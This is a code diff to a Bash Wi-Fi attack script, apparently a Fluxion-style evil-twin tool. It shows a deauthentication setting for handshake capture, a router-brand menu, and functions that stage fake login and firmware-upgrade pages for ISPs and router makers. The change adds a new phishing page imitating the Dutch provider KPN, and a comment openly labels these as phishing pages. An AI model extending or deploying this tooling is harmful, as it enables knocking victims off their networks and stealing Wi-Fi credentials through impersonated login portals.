@@ -33,7 +33,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=112
+revision=113
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -4002,6 +4002,7 @@ function ConnectionRESET {
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" TP-Link     [ITA]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Ziggo       [NL]";n=` expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" KPN         [NL]";n=` expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
@@ -4370,7 +4371,11 @@ function ConnectionRESET {
 				ZIGGO_NL
 				break
 
-      			elif [ "$fluxass" = "34" ]; then
+			elif [ "$fluxass" = "34" ]; then
+				KPN_NL
+				break
+
+      			elif [ "$fluxass" = "35" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -7204,7 +7209,8 @@ ACQAAAAAAAAAIAAAAAzpAQBqcy9tYWluLmpzCgAgAAAAAAABABgAwGkPId0k0gFxv9MKziTSATNj
 	</body>
 </html>" > $DUMP_PATH/data/index.htm
 }
-# Crea el contenido de la interface web
+
+# Functions to populate the content for the custom phishing pages
 function ARRIS {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
@@ -7216,7 +7222,6 @@ function ARRIS {
 	cp $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
 }
 
-#Conten interface web
 function BELKIN {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
@@ -7231,7 +7236,6 @@ function BELKIN {
 	cp $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
 }
 
-#Conten interface web
 function NETGEAR {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
@@ -7246,7 +7250,6 @@ function NETGEAR {
 	cp $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
 }
 
-#Conten interface web
 function ARRIS2 {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
@@ -7261,7 +7264,6 @@ function ARRIS2 {
 	cp $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
 }
 
-#Conten interface web
 function NETGEAR2 {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
@@ -7275,10 +7277,9 @@ function NETGEAR2 {
 	cp $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
 	cp $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
 }
-#Conten interface web
-function TPLINK {
 
-mkdir $DUMP_PATH/data &>$flux_output_device
+function TPLINK {
+	mkdir $DUMP_PATH/data &>$flux_output_device
         cp $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.css $DUMP_PATH/data
         cp $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.js $DUMP_PATH/data
         cp $WORK_DIR/Sites/Upgrade-TP-LINK/index.html $DUMP_PATH/data
@@ -7287,9 +7288,7 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp $WORK_DIR/Sites/Upgrade-TP-LINK/error.html $DUMP_PATH/data
 }
 
-#Conten interface web
 function TPLINK_ITA {
-
 mkdir $DUMP_PATH/data &>$flux_output_device
         cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.css $DUMP_PATH/data
         cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.js $DUMP_PATH/data
@@ -7299,8 +7298,6 @@ mkdir $DUMP_PATH/data &>$flux_output_device
         cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/error.html $DUMP_PATH/data
 }
 
-
-#Conten interface web
 function VODAFONE {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/VODAFONE-ESP/info2.css $DUMP_PATH/data
@@ -7315,7 +7312,6 @@ function VODAFONE {
 	cp $WORK_DIR/Sites/VODAFONE-ESP/index.htm $DUMP_PATH/data
 }
 
-#Conten interface web
 function VERIZON {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
@@ -7328,7 +7324,6 @@ function XFINITY {
 	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
 }
 
-#Conten interface web
 function HUAWEI {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
@@ -7347,6 +7342,12 @@ function ZIGGO_NL {
 	mkdir $DUMP_PATH/data &>$flux_output_device
 	cp $WORK_DIR/Sites/ZIGGO_NL/* $DUMP_PATH/data
 	}
+
+function KPN_NL {
+	mkdir $DUMP_PATH/data &>$flux_output_device
+	cp $WORK_DIR/Sites/KPN_NL/* $DUMP_PATH/data
+	}
+
 
 ######################################### < INTERFACE WEB > ########################################
 top&& setresolution && setinterface
